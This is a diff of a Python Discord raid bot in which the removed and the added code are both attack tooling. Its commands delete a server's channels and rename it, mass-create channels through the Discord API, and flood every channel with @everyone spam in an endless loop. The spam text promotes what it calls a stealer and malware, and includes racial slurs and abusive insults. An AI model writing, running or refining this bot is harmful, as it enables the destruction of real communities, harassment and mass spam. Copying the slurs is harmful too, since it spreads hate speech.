@@ -1,90 +1,46 @@
 import discord
 from discord.ext import commands
 import asyncio
-import random, discord, threading, os, datetime, asyncio
-from concurrent.futures import ThreadPoolExecutor
-from time import sleep
-from colorama import Fore, Back, Style
-from discord.ext import commands, tasks
 import aiohttp
-import requests
-from colorama import Fore, Back, Style, init
+import json
+
+with open('config.json') as f:
+    config = json.load(f)
+
+TOKEN = config['token']
+PREFIX = config['prefix']
+GUILD_ID = "1407533053055864923"
 
 intents = discord.Intents.default()
 intents.message_content = True
 intents.guilds = True
 intents.guild_messages = True
 
-bot = commands.Bot(command_prefix='$', intents=intents)
+bot = commands.Bot(command_prefix=PREFIX, intents=intents)
 
-init(autoreset=True)
+@bot.event
+async def on_ready():
+    print(f"Creo que {bot.user} esta conectado :v")
 
-ascii_art = Fore.MAGENTA + r"""
-  /$$$$$$            /$$  /$$$$$$        /$$   /$$           /$$                                
- /$$__  $$          | $$ /$$__  $$      | $$$ | $$          | $$                                
-| $$  \__/  /$$$$$$ | $$| $$  \__/      | $$$$| $$ /$$   /$$| $$   /$$  /$$$$$$   /$$$$$$       
-|  $$$$$$  /$$__  $$| $$| $$$$          | $$ $$ $$| $$  | $$| $$  /$$/ /$$__  $$ /$$__  $$      
- \____  $$| $$$$$$$$| $$| $$_/          | $$  $$$$| $$  | $$| $$$$$$/ | $$$$$$$$| $$  \__/      
- /$$  \ $$| $$_____/| $$| $$            | $$\  $$$| $$  | $$| $$_  $$ | $$_____/| $$            
-|  $$$$$$/|  $$$$$$$| $$| $$            | $$ \  $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$            
- \______/  \_______/|__/|__/            |__/  \__/ \______/ |__/  \__/ \_______/|__/       
-                                                                                                      
-:: Self Commands ::
-*nuke     - Nuke server
-*spam     - Spams channels
-*helpm    - all the commands
+async def create_channel(session, nombre, guild_id, token):
+    url = f"https://discord.com/api/v10/guilds/{guild_id}/channels"
+    headers = {
+        "Authorization": f"Bot {token}",
+        "Content-Type": "application/json"
+    }
+    data = {"name": nombre, "type": 0}
 
-Self Nuker V1
-By - ils
-"""
-
-print(ascii_art)
+    async with session.post(url, headers=headers, json=data) as response:
+        if response.status == 429:
+            retry_after = int(response.headers.get('Retry-After', 1))
+            await asyncio.sleep(retry_after)
+            await create_channel(session, nombre, guild_id, token)
 
 @bot.command()
-async def spam(ctx):
-    try:
-        await ctx.message.delete()
-    except:
-        pass
-
-    new_message = (
-        "||@everyone @here|| `Join dc:` discord.gg/ZW9fQksY6F\n"
-        "https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif\n"
-        "F = Anormal de mierda, Self on top! \n"
-    )
-
-    embed_message = discord.Embed(title="MUERETE ANORMAL      ﹒    __Self on Top niggas__", url="https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif?width=448&height=190")
-    embed_message.set_image(url="https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif?width=448&height=190")
-
-    channel_names = [
-        "~~SelfPwnedThisShit~~",
-        "~~MuereteAnormal~~",
-        "~~SelfOnTop~~"
-    ]
-
-    async def create_channel(name, message_count):
-        for _ in range(20):
-            try:
-                new_channel = await ctx.guild.create_text_channel(name)
-                if name in ["~~SelfPwnedThisShit~~", "~~SelfOnTop~~"]:
-                    for _ in range(message_count):
-                        await new_channel.send("||@everyone @here||")
-                        await new_channel.send(embed=embed_message)
-                        await asyncio.sleep(0.1)
-                else:
-                    tasks = [new_channel.send(new_message) for _ in range(message_count)]
-                    await asyncio.gather(*tasks)
-                await asyncio.sleep(0.1)
-            except Exception as e:
-                print(f"")
-                await asyncio.sleep(0.1)
-
-    tasks = []
-    for i in range(60):
-        name = channel_names[i % 3]
-        tasks.append(create_channel(name, 20))
-
-    await asyncio.gather(*tasks)
+async def raid(ctx):
+    async with aiohttp.ClientSession() as session:
+        tasks = [create_channel(session, "SelfPwnedThis", GUILD_ID, TOKEN) for _ in range(50)]
+        await asyncio.gather(*tasks)
 
 @bot.command()
 @commands.has_permissions(administrator=True)
@@ -98,7 +54,7 @@ async def nuke(ctx):
     if guild is None:
         return
 
-    image_url = "https://media.discordapp.net/attachments/1404343683100184660/1406773688417910834/3f820e399988cc6121a1e405cd96059c.webp?ex=68a45857&is=68a306d7&hm=84fd125cc4cb25dd9050dc1ce34c67c41740073f87fd848bf7b245b6f7d4d3b3&=&format=webp&width=507&height=507"  
+    image_url = "https://cdn.discordapp.com/icons/1406989334933930228/b1dc437cf58516f6aefc6c3804b0a963.webp?size=1024"
 
     try:
         async with aiohttp.ClientSession() as session:
@@ -118,29 +74,56 @@ async def nuke(ctx):
         pass
 
     try:
-        await guild.create_text_channel("Raid-By-Self")
+        await guild.create_text_channel("selfpwnedthis")
     except:
         pass
     
 @bot.command()
-async def helpm(ctx):
+async def spam(ctx):
+    guild = ctx.guild
+    if guild is None:
+        return
+
+    channels = guild.text_channels
+
+    embed2 = discord.Embed(
+        title="Dev social media",
+        description=(
+            "_ _ ⠀   ⠀  :rat:      ***__Rbot⠀ ⠀ Raids⠀ ⠀ Malware__***\n\n"
+            "**         __Only ils & Your Mother__**\n\n"
+            "   [/NiggaStealer](https://discord.gg/3SJscqyafq)\n"
+            " [/SWgvng](https://discord.gg/3SJscqyafq)\n\n"
+            "**SWgvng** Pwned Shitty Server\n\n"
+            "~~F = all words that start with the letter :skull_crossbones:~~"
+        ),
+        color=0x2F3136
+    )
+    embed2.set_image(
+        url="https://cdn.discordapp.com/attachments/1406989335458480283/1407749437346021397/young-ezgif.com-optimize.gif"
+    )
+
+    tasks = []
+    for channel in channels:
+        for _ in range(20):
+            tasks.append(channel.send("@everyone @here https://discord.gg/3SJscqyafq"))
+            tasks.append(channel.send(embed=embed2))
+            tasks.append(channel.send("@everyone @here https://discord.gg/3SJscqyafq"))
+
     try:
-        await ctx.message.delete()
-    except:
+        await asyncio.gather(*tasks)
+    except discord.errors.HTTPException:
         pass
 
-    embed = discord.Embed(title="`Self Rbot 亗`", description="", color=0x000001)
+    for channel in channels:
+        while True:
+            try:
+                await channel.send("@everyone @here")
+                await channel.send(embed=embed2)
+                await channel.send("@everyone @here")
+                await asyncio.sleep(1)
+            except discord.Forbidden:
+                pass
+            except discord.errors.HTTPException:
+                pass
 
-    embed.add_field(name="`• $nuke:`", value="Elimina todos los canales y cambia el icono y nombre del servidor.", inline=False)
-    embed.add_field(name="`• $spam:`", value="Crea canales y envia spam", inline=False)
-    embed.add_field(name="`• $helpm:`", value="Todos los comandos del bot.", inline=False)
-
-    embed.set_footer(text="`Prefix: $`")
-    embed.set_footer(text="`Creator bot: ils`")
-    embed.set_footer(text="https://guns.lol/ilsss                                            Best Rbot, ilswashere on top")
-
-    embed.set_image(url="https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif")
-
-    await ctx.send(embed=embed)
-
-bot.run("Your bot token here")
+bot.run(TOKEN)
